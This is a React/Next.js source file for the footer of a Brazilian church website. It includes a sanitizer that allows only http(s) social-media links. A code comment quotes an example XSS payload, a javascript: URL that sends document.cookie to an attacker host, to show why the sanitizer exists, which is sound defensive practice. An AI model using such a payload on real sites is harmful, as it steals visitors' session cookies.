import Link from "next/link";
import type { CampusPublico, ConfigSite } from "@/lib/services/site";

/**
 * Rodapé do site (padrão da referência Discipular): CTA "Venha para casa",
 * quatro colunas (marca + navegação + comunidade + contato) e a marca-d'água
 * gigante ao fundo.
 *
 * Links de redes sociais vêm do banco (o cliente edita no painel) e passam por
 * `linkSeguro()` antes de virar `href`: sem isso, um valor como
 * `javascript:fetch('//atacante/'+document.cookie)` salvo no painel viraria
 * XSS em toda página do site.
 */

/** Só permite http(s). Qualquer outro esquema vira link morto. */
function linkSeguro(url: string | null | undefined): string | null {
  if (!url) return null;
  const v = url.trim();
  try {
    const u = new URL(v.startsWith("http") ? v : `https://${v}`);
    if (u.protocol !== "https:" && u.protocol !== "http:") return null;
    return u.toString();
  } catch {
    return null;
  }
}

/** Monta link de WhatsApp a partir dos dígitos, nunca de texto livre. */
function linkWhatsapp(numero: string | null): string | null {
  if (!numero) return null;
  const digitos = numero.replace(/\D/g, "");
  if (digitos.length < 10 || digitos.length > 13) return null;
  const comPais = digitos.startsWith("55") ? digitos : `55${digitos}`;
  return `https://wa.me/${comPais}`;
}

function IconeInstagram() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" aria-hidden="true">
      <rect x="3" y="3" width="18" height="18" rx="5" />
      <circle cx="12" cy="12" r="4" />
      <circle cx="17.5" cy="6.5" r="1" fill="currentColor" stroke="none" />
    </svg>
  );
}
function IconeYoutube() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" aria-hidden="true">
      <rect x="2.5" y="5.5" width="19" height="13" rx="4" />
      <path d="M10.5 9.5v5l4.5-2.5-4.5-2.5z" fill="currentColor" stroke="none" />
    </svg>
  );
}
function IconeWhatsapp() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" aria-hidden="true">
      <path d="M12 3a9 9 0 0 0-7.7 13.6L3 21l4.5-1.2A9 9 0 1 0 12 3z" strokeLinejoin="round" />
      <path d="M8.5 8.5c-.3 1.5.4 3.2 1.8 4.6s3.1 2.1 4.6 1.8c.5-.1.8-.6.7-1.1l-.3-1c-.1-.4-.5-.6-.9-.5l-1 .3-1.9-1.9.3-1c.1-.4-.1-.8-.5-.9l-1-.3c-.5-.1-1 .2-1.1.7z" fill="currentColor" stroke="none" />
    </svg>
  );
}

export function Rodape({
  config,
  campi,
  menu,
  marcaUrl,
}: {
  config: ConfigSite;
  campi: CampusPublico[];
  menu: { rotulo: string; href: string }[];
  marcaUrl?: string | null;
}) {
  const ano = new Date().getFullYear();

  const instagram = linkSeguro(config.instagram);
  const youtube = linkSeguro(config.youtube);
  const whatsapp = linkWhatsapp(config.whatsapp);
  const mapaCelulas = "https://sites.google.com/view/casasdediscipulos/home";

  const redes = [
    instagram ? { nome: "Instagram", url: instagram, Icone: IconeInstagram } : null,
    youtube ? { nome: "YouTube", url: youtube, Icone: IconeYoutube } : null,
    whatsapp ? { nome: "WhatsApp", url: whatsapp, Icone: IconeWhatsapp } : null,
  ].filter((r): r is { nome: string; url: string; Icone: () => React.JSX.Element } => r !== null);

  return (
    <footer className="site-footer theme-dark">
      {/* Marca-d'água gigante ao fundo. */}
      <span className="footer-watermark" aria-hidden="true">
        {config.nomeExibicao.split(" ")[0]?.toUpperCase()}
      </span>

      <div className="container container--wide">
        {/* Chamada final */}
        <div className="footer-cta">
          <p className="eyebrow eyebrow--centered">Venha para casa</p>
          <h2>
            Seja <span className="serif-italic accent">bem-vindo</span>.
          </h2>
          <div className="footer-cta__acoes">
            <Link href="/quem-somos" className="btn btn--lg">
              Conheça mais
            </Link>
            <a href={mapaCelulas} target="_blank" rel="noopener noreferrer" className="btn btn--lg btn--ghost">
              Encontre uma célula
            </a>
          </div>
        </div>

        <div className="footer-grid">
          {/* Coluna da marca */}
          <div>
            {marcaUrl ? (
              // eslint-disable-next-line @next/next/no-img-element
              <img src={marcaUrl} alt={config.nomeExibicao} className="footer-brand__mark" />
            ) : (
              <p className="brand__nome" style={{ fontSize: "1.4rem" }}>
                {config.nomeExibicao}
              </p>
            )}
            <p className="footer-sobre">
              {config.tagline
                ? `${config.nomeExibicao}. ${config.tagline}`
                : "Uma comunidade de discípulos de Jesus. Da cidade para as nações, gerando vida e transformação."}
            </p>
            {redes.length > 0 && (
              <div className="footer-social">
                {redes.map(({ nome, url, Icone }) => (
                  <a key={nome} href={url} target="_blank" rel="noopener noreferrer" aria-label={nome}>
                    <Icone />
                  </a>
                ))}
              </div>
            )}
          </div>

          {/* Navegação */}
          <div>
            <p className="footer-titulo">Navegação</p>
            <ul className="footer-lista">
              {menu.map((item) => (
                <li key={item.href}>
                  <Link href={item.href}>{item.rotulo}</Link>
                </li>
              ))}
            </ul>
          </div>

          {/* Comunidade */}
          <div>
            <p className="footer-titulo">Comunidade</p>
            <ul className="footer-lista">
              <li>
                <a href={mapaCelulas} target="_blank" rel="noopener noreferrer">
                  Encontre uma célula
                </a>
              </li>
              <li>
                <Link href="/escola">Cursos &amp; inscrições</Link>
              </li>
              <li>
                <Link href="/contribua">Contribua (PIX)</Link>
              </li>
              {youtube && (
                <li>
                  <a href={youtube} target="_blank" rel="noopener noreferrer">
                    Assista ao vivo
                  </a>
                </li>
              )}
            </ul>
          </div>

          {/* Contato */}
          <div>
            <p className="footer-titulo">Contato</p>
            <ul className="footer-lista">
              {config.emailContato && (
                <li>
                  <a href={`mailto:${config.emailContato}`}>{config.emailContato}</a>
                </li>
              )}
              {config.telefoneContato && (
                <li>
                  <a href={`tel:+${config.telefoneContato.replace(/\D/g, "")}`}>{config.telefoneContato}</a>
                </li>
              )}
              {campi.map((campus) => (
                <li key={campus.id}>
                  <span style={{ color: "var(--bone-dim)", fontSize: "0.9rem" }}>
                    <strong style={{ color: "var(--bone)", fontWeight: 600 }}>{campus.nome}:</strong>{" "}
                    {[campus.logradouro, campus.numero].filter(Boolean).join(", ")}
                    {campus.bairro && ` – ${campus.bairro}`}
                    {campus.cidade && `, ${campus.cidade}`}
                    {campus.uf && `/${campus.uf}`}
                  </span>
                </li>
              ))}
            </ul>
          </div>
        </div>

        <div className="footer-base">
          <span>
            © {ano} {config.nomeExibicao}
            {config.tagline ? ` · ${config.tagline}` : ""}
          </span>
          <span style={{ display: "flex", gap: "1.2rem", flexWrap: "wrap" }}>
            <Link href="/privacidade">Privacidade</Link>
            <Link href="/app">Aplicativo</Link>
            <Link href="/painel">Área restrita</Link>
          </span>
        </div>
      </div>
    </footer>
  );
}
